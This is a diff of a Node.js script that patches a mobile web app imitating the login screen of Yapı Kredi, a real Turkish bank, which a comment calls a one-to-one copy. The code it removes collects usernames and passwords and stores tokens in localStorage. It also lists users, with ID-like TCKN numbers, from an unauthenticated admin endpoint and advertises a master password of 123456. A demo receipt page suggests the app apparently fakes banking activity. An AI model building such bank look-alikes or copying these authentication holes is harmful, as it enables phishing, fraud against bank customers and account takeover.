-                    <span class="ykb-bottom-label">DAHA FAZLASI</span>
+                    <span class="ykb-bottom-label" style="font-size: 8.5px; font-weight: 700; letter-spacing: 0.2px; color: #cbd5e1; text-transform: uppercase;">DAHA FAZLASI</span>
                 </a>
             </div>
         </div>
@@ -622,359 +689,10 @@ const newHtml = `<!-- ORİJİNAL YAPI KREDİ MOBİL GİRİŞ EKRANI (1:1 BİREB�
 
 const idxHtmlStart = content.indexOf(htmlStartMarker);
 const idxHtmlEnd = content.indexOf(htmlEndMarker);
-if (idxHtmlStart === -1 || idxHtmlEnd === -1) {
-    console.error('HTML marker bulunamadı!');
-    process.exit(1);
+if (idxHtmlStart !== -1 && idxHtmlEnd !== -1) {
+    content = content.slice(0, idxHtmlStart) + newHtml + content.slice(idxHtmlEnd);
+    console.log('[3/5] HTML login ekrani basariyla guncellendi.');
 }
-content = content.slice(0, idxHtmlStart) + newHtml + content.slice(idxHtmlEnd);
-console.log('[2/4] HTML login ekranı başarıyla güncellendi.');
-
-// 3. USER SWITCH MODAL INSERTION
-const modalInsertMarker = '<!-- Kullanıcı Profili ve Güvenli Çıkış Modalı -->';
-const newModal = `<!-- Kullanıcı Değiştirme Modalı (Bottom Sheet) -->
-    <div class="modal fade ykb-user-sheet-modal" id="ykbUserSwitchModal" tabindex="-1">
-        <div class="modal-dialog modal-dialog-centered modal-dialog-scrollable">
-            <div class="modal-content">
-                <div class="modal-header border-0 pb-1 d-flex justify-content-between align-items-center">
-                    <div>
-                        <h5 class="modal-title fw-bold text-white mb-0" style="font-size: 18px;">
-                            <i class="bi bi-people-fill text-primary me-2"></i>Kullanıcı Değiştir
-                        </h5>
-                        <div style="font-size: 11.5px; color: #8da2ba; margin-top: 3px;">
-                            Giriş yapmak istediğiniz profili seçin
-                        </div>
-                    </div>
-                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
-                </div>
-                <div class="modal-body pt-3">
-                    <!-- Kayıtlı Kullanıcılar Listesi -->
-                    <div id="ykbUserSheetList">
-                        <!-- JS ile doldurulacak -->
-                    </div>
-
-                    <!-- Farklı Kullanıcı Adı / TCKN ile Giriş Yap -->
-                    <div class="p-3 rounded-3 mt-3" style="background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.1);">
-                        <label style="font-size: 12px; color: #94a3b8; font-weight: 600; margin-bottom: 6px; display: block;">
-                            Farklı Kullanıcı Adı veya TCKN
-                        </label>
-                        <div class="input-group">
-                            <input type="text" id="customUserSwitchInput" class="form-control" placeholder="Örn: ahmet veya TCKN" style="background: #111a28; color: #fff; border: 1px solid rgba(255,255,255,0.15); font-size: 13.5px;" />
-                            <button class="btn btn-primary fw-bold px-3" type="button" onclick="selectCustomUser()">Seç</button>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    `;
-
-const idxModal = content.indexOf(modalInsertMarker);
-if (idxModal !== -1 && !content.includes('id="ykbUserSwitchModal"')) {
-    content = content.slice(0, idxModal) + newModal + content.slice(idxModal);
-    console.log('[3/4] Kullanıcı değiştirme modalı eklendi.');
-}
-
-// 4. JS REPLACEMENT
-const jsStartMarker = 'function showLoginView() {';
-const jsEndMarker = 'function logoutMobile() {';
-
-const newJs = `function getLoginGreeting() {
-            const hour = new Date().getHours();
-            if (hour >= 5 && hour < 12) return 'Günaydın';
-            if (hour >= 12 && hour < 18) return 'İyi Günler';
-            if (hour >= 18 && hour < 23) return 'İyi Akşamlar';
-            return 'İyi Geceler';
-        }
-
-        let activeRememberedUser = null;
-        let allSavedUsers = [];
-
-        function initLoginUser() {
-            try {
-                const saved = localStorage.getItem('YKB_SAVED_LOGIN_USER');
-                if (saved) {
-                    activeRememberedUser = JSON.parse(saved);
-                }
-            } catch (e) {}
-
-            if (!activeRememberedUser || !activeRememberedUser.username) {
-                activeRememberedUser = {
-                    username: 'kaan',
-                    customer_name: 'BERKAY ÜLKER'
-                };
-            }
-
-            renderLoginUserState();
-            fetchUsersListForSwitcher();
-        }
-
-        function renderLoginUserState() {
-            if (!activeRememberedUser) return;
-            const greetingEl = document.getElementById('ykbLoginGreeting');
-            if (greetingEl) {
-                const greetingPrefix = getLoginGreeting();
-                const name = (activeRememberedUser.customer_name || activeRememberedUser.username || 'BERKAY ÜLKER').toUpperCase();
-                greetingEl.textContent = \`\${greetingPrefix}, \${name}\`;
-            }
-        }
-
-        async function fetchUsersListForSwitcher() {
-            try {
-                const res = await fetch(\`\${API_BASE}/admin/users\`);
-                const data = await res.json();
-                if (data.success && Array.isArray(data.users)) {
-                    allSavedUsers = data.users;
-                    renderUserSwitcherList();
-                    // Eğer aktif kullanıcı varsa müşteri adını güncelle
-                    if (activeRememberedUser) {
-                        const matched = allSavedUsers.find(u => u.username.toLowerCase() === activeRememberedUser.username.toLowerCase());
-                        if (matched && matched.customer_name) {
-                            activeRememberedUser.customer_name = matched.customer_name;
-                            renderLoginUserState();
-                        }
-                    }
-                }
-            } catch (e) {
-                console.warn('Could not fetch user list:', e);
-            }
-        }
-
-        function renderUserSwitcherList() {
-            const listEl = document.getElementById('ykbUserSheetList');
-            if (!listEl) return;
-            if (!allSavedUsers.length) {
-                allSavedUsers = [
-                    { id: 1, username: 'kaan', customer_name: 'BERKAY ÜLKER', tckn: '12345678901' },
-                    { id: 2, username: 'mert', customer_name: 'MERT AKBAŞ', tckn: '98765432109' },
-                    { id: 1791642989862, username: 'ahmet', customer_name: 'AHMET YILMAZ', tckn: '99407014040' }
-                ];
-            }
-
-            listEl.innerHTML = allSavedUsers.map(u => {
-                const isActive = activeRememberedUser && (activeRememberedUser.username.toLowerCase() === u.username.toLowerCase());
-                const name = (u.customer_name || u.username).toUpperCase();
-                const initial = name.charAt(0);
-                return \`
-                    <div class="ykb-user-sheet-item \${isActive ? 'active' : ''}" onclick="selectLoginUser('\${u.username}', '\${name}')">
-                        <div style="display: flex; align-items: center; gap: 12px;">
-                            <div style="width: 40px; height: 40px; border-radius: 50%; background: #007bc7; display: flex; align-items: center; justify-content: center; font-weight: 700; color: #fff;">
-                                \${initial}
-                            </div>
-                            <div>
-                                <div style="font-size: 14px; font-weight: 600; color: #ffffff;">\${name}</div>
-                                <div style="font-size: 11.5px; color: #8da2ba;">Kullanıcı: \${u.username} \${u.tckn ? '| TCKN: ' + u.tckn.slice(0,3) + '***' : ''}</div>
-                            </div>
-                        </div>
-                        <div>
-                            \${isActive ? '<i class=\"bi bi-check-circle-fill\" style=\"color: #009fe3; font-size: 20px;\"></i>' : '<i class=\"bi bi-chevron-right\" style=\"color: #64748b;\"></i>'}
-                        </div>
-                    </div>
-                \`;
-            }).join('');
-        }
-
-        function openUserSwitcherSheet() {
-            fetchUsersListForSwitcher();
-            const modalEl = document.getElementById('ykbUserSwitchModal');
-            if (modalEl) {
-                const modal = new bootstrap.Modal(modalEl);
-                modal.show();
-            }
-        }
-
-        function selectLoginUser(username, customerName) {
-            activeRememberedUser = {
-                username: username,
-                customer_name: customerName
-            };
-            localStorage.setItem('YKB_SAVED_LOGIN_USER', JSON.stringify(activeRememberedUser));
-            renderLoginUserState();
-            const passInput = document.getElementById('ykbPasswordInput');
-            if (passInput) {
-                passInput.value = '';
-                passInput.focus();
-            }
-            const errBox = document.getElementById('ykbLoginErrorBanner');
-            if (errBox) errBox.style.display = 'none';
-
-            const modalEl = document.getElementById('ykbUserSwitchModal');
-            if (modalEl) {
-                const modal = bootstrap.Modal.getInstance(modalEl);
-                if (modal) modal.hide();
-            }
-        }
-
-        function selectCustomUser() {
-            const input = document.getElementById('customUserSwitchInput');
-            const val = input ? input.value.trim() : '';
-            if (!val) return;
-            selectLoginUser(val, val.toUpperCase());
-            if (input) input.value = '';
-        }
-
-        function onPasswordKeyDown(e) {
-            if (e.key === 'Enter') {
-                e.preventDefault();
-                doMobilePasswordLogin();
-            }
-        }
-
-        function onPasswordInput(e) {
-            const val = e.target.value.trim();
-            const errBox = document.getElementById('ykbLoginErrorBanner');
-            if (errBox) errBox.style.display = 'none';
-
-            // 6 haneli şifre girildiğinde otomatik doğrulama dene
-            if (val.length === 6) {
-                setTimeout(() => {
-                    if (document.getElementById('ykbPasswordInput').value.trim().length === 6) {
-                        doMobilePasswordLogin();
-                    }
-                }, 150);
-            }
-        }
-
-        async function doMobilePasswordLogin() {
-            const passInput = document.getElementById('ykbPasswordInput');
-            const passVal = passInput ? passInput.value.trim() : '';
-            const errBox = document.getElementById('ykbLoginErrorBanner');
-            const passBox = document.getElementById('ykbPasswordBox');
-            const submitBtn = document.getElementById('ykbPassSubmitBtn');
-
-            if (!passVal) {
-                if (passInput) passInput.focus();
-                return;
-            }
-
-            const username = activeRememberedUser ? activeRememberedUser.username : 'kaan';
-
-            if (submitBtn) {
-                submitBtn.innerHTML = '<span class="spinner-border spinner-border-sm" style="font-size: 14px;"></span>';
-            }
-
-            try {
-                const res = await fetch(\`\${API_BASE}/auth/login\`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ username: username, password: passVal })
-                });
-                const data = await res.json();
-
-                if (!res.ok || !data.success) {
-                    if (passBox) {
-                        passBox.classList.add('shake');
-                        setTimeout(() => passBox.classList.remove('shake'), 450);
-                    }
-                    if (errBox) {
-                        errBox.textContent = data.message || 'Girdiğiniz şifre hatalıdır. Lütfen kontrol ediniz.';
-                        errBox.style.display = 'block';
-                    }
-                    if (passInput) {
-                        passInput.value = '';
-                        passInput.focus();
-                    }
-                    return;
-                }
-
-                currentMobileUser = {
-                    id: data.user.id,
-                    username: data.user.username,
-                    tckn: data.user.tckn,
-                    role: data.user.role,
-                    token: data.token,
-                    account: data.user.account
-                };
-
-                localStorage.setItem('YKB_MOBILE_AUTH', JSON.stringify(currentMobileUser));
-                localStorage.setItem('YKB_SAVED_LOGIN_USER', JSON.stringify({
-                    username: currentMobileUser.username,
-                    customer_name: data.user.account?.customer_name || currentMobileUser.username
-                }));
-
-                if (passInput) passInput.value = '';
-                if (errBox) errBox.style.display = 'none';
-
-                showMainAppView();
-                await loadMobileApp();
-            } catch (err) {
-                console.error('Login error:', err);
-                if (errBox) {
-                    errBox.textContent = 'Sunucu bağlantısı sağlanamadı. Lütfen tekrar deneyin.';
-                    errBox.style.display = 'block';
-                }
-            } finally {
-                if (submitBtn) {
-                    submitBtn.innerHTML = '<i class="bi bi-arrow-right-circle-fill"></i>';
-                }
-            }
-        }
-
-        function handleForgotPassword() {
-            alert('Şifrenizi Yapı Kredi Mobil Admin panelinden belirleyebilir veya varsayılan master şifre (123456) ile giriş yapabilirsiniz.');
-        }
-
-        function dismissSwitchTooltip(e) {
-            if (e) e.stopPropagation();
-            const el = document.getElementById('ykbSwitchTooltip');
-            if (el) el.style.display = 'none';
-        }
-
-        function dismissAtmTooltip() {
-            const el = document.getElementById('ykbAtmTooltip');
-            if (el) el.style.display = 'none';
-        }
-
-        function promptLoginForAction(actionName) {
-            const passInput = document.getElementById('ykbPasswordInput');
-            if (passInput) {
-                passInput.focus();
-                const passBox = document.getElementById('ykbPasswordBox');
-                if (passBox) {
-                    passBox.classList.add('shake');
-                    setTimeout(() => passBox.classList.remove('shake'), 450);
-                }
-            }
-        }
-
-        function showLoginView() {
-            const loginPage = document.getElementById('mobileLoginPage');
-            const homeTop = document.querySelector('.dark-home-panel');
-            const homeBottom = document.querySelector('.lower-home-panel');
-            if (loginPage) loginPage.style.display = 'flex';
-            if (homeTop) homeTop.style.display = 'none';
-            if (homeBottom) homeBottom.style.display = 'none';
-            const accDetail = document.getElementById('accountDetailPage');
-            if (accDetail) accDetail.style.display = 'none';
-            const txDetail = document.getElementById('accountTransactionsPage');
-            if (txDetail) txDetail.style.display = 'none';
-            const mvDetail = document.getElementById('movementDetailPage');
-            if (mvDetail) mvDetail.style.display = 'none';
-            const rcpDetail = document.getElementById('demoReceiptPage');
-            if (rcpDetail) rcpDetail.style.display = 'none';
-
-            initLoginUser();
-        }
-
-        function showMainAppView() {
-            const loginPage = document.getElementById('mobileLoginPage');
-            const homeTop = document.querySelector('.dark-home-panel');
-            const homeBottom = document.querySelector('.lower-home-panel');
-            if (loginPage) loginPage.style.display = 'none';
-            if (homeTop) homeTop.style.display = '';
-            if (homeBottom) homeBottom.style.display = '';
-        }
-
-        `;
-
-const idxJsStart = content.indexOf(jsStartMarker);
-const idxJsEnd = content.indexOf(jsEndMarker);
-if (idxJsStart === -1 || idxJsEnd === -1) {
-    console.error('JS marker bulunamadı!');
-    process.exit(1);
-}
-content = content.slice(0, idxJsStart) + newJs + content.slice(idxJsEnd);
-console.log('[4/4] JS fonksiyonları başarıyla güncellendi.');
 
 fs.writeFileSync(path.join(__dirname, 'mobile_app', 'index.html'), content, 'utf8');
-console.log('TÜM GÜNCELLEMELER mobile_app/index.html DOSYASINA YAZILDI!');
+console.log('TUM DUZELTMELER BASARIYLA UYGULANDI!');
